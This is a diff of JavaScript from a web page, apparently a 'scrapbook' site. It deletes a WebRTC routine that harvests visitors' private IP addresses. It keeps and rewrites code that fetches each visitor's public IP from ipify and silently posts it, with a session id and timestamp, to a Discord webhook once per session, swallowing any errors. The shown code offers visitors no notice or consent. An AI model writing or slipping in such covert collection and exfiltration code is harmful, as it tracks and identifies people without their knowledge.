@@ -171,43 +171,8 @@
         }
     }
 
-    // --- Address gathering & one-shot send (public IP + local IPs via WebRTC) ---
-    // Gather local/private IPs via WebRTC ICE candidates. Returns a Promise<string[]>.
-    function getLocalIPs(timeout = 2000) {
-        return new Promise((resolve) => {
-            const ips = new Set();
-            // Compatibility
-            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            if (!RTCPeerConnection) return resolve([]);
-
-            const pc = new RTCPeerConnection({iceServers:[]});
-            // Create a bogus data channel
-            try { pc.createDataChannel(''); } catch(e){}
-
-            pc.onicecandidate = function(e) {
-                if (!e || !e.candidate) return;
-                const parts = e.candidate.candidate.split(' ');
-                // candidate format: candidate:foundation 1 udp 2122260223 192.168.1.2 56143 typ host ...
-                for (let i=0;i<parts.length;i++) {
-                    const p = parts[i];
-                    if (p && p.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/)) {
-                        ips.add(p);
-                    }
-                }
-            };
-
-            // Create offer and set local description to trigger candidates
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(()=>{});
-
-            // Timeout and cleanup
-            setTimeout(() => {
-                try { pc.close(); } catch(e){}
-                resolve(Array.from(ips));
-            }, timeout);
-        });
-    }
-
-    // Try to fetch public IP using ipify. If blocked/unavailable, resolves to null.
+    // --- Public IP gathering & one-shot send ---
+    // We collect only the public IP (via ipify) and send that once per session.
     async function getPublicIP() {
         try {
             const resp = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
@@ -217,35 +182,28 @@
         } catch (e) { return null; }
     }
 
-    async function sendAddressesToWebhook(addresses) {
+    async function sendPublicIPToWebhook(publicIp) {
         try {
-            const addrList = addresses.filter(Boolean);
-            if (!addrList.length) return;
-            const summary = addrList.join(', ');
-            const content = `Tracking addresses (session:${sessionId}) ts:${Date.now()}\n${summary}`;
+            if (!publicIp) return;
+            const content = `PublicIP (session:${sessionId}) ts:${Date.now()}\n${publicIp}`;
             await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ content }) }).catch(()=>{});
         } catch (e) { /* ignore */ }
     }
 
-    // Gather addresses and send once per session. Uses sessionStorage sentinel to avoid repeats.
+    // Gather public IP and send once per session. Uses sessionStorage sentinel to avoid repeats.
     async function gatherAndSendAddressesOnce() {
         try {
-            const sentKey = 'scrapbook_addresses_sent_' + (sessionId || 'anon');
+            const sentKey = 'scrapbook_publicip_sent_' + (sessionId || 'anon');
             if (sessionStorage.getItem(sentKey)) return; // already sent this session
-            // Gather local and public IPs in parallel
-            const [localIps, publicIp] = await Promise.all([getLocalIPs(1800), getPublicIP()]);
-            const addresses = [];
-            if (publicIp) addresses.push('public:'+publicIp);
-            (localIps||[]).forEach(ip => addresses.push('local:'+ip));
-            // send best-effort to webhook (may be blocked by CORS). Also keep a local queued record.
-            if (addresses.length) {
+            const publicIp = await getPublicIP();
+            if (publicIp) {
                 // Keep a small record locally for auditing
-                const record = { type:'addresses', ts: Date.now(), sessionId, addresses };
+                const record = { type:'public_ip', ts: Date.now(), sessionId, publicIp };
                 const evts = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
                 evts.push(record);
                 localStorage.setItem(STORAGE_KEY, JSON.stringify(evts));
-                // Attempt to send to webhook
-                try { await sendAddressesToWebhook(addresses); } catch(e){}
+                // Attempt to send to webhook (may be blocked by CORS)
+                try { await sendPublicIPToWebhook(publicIp); } catch(e){}
             }
             sessionStorage.setItem(sentKey, '1');
         } catch (e) { /* ignore */ }
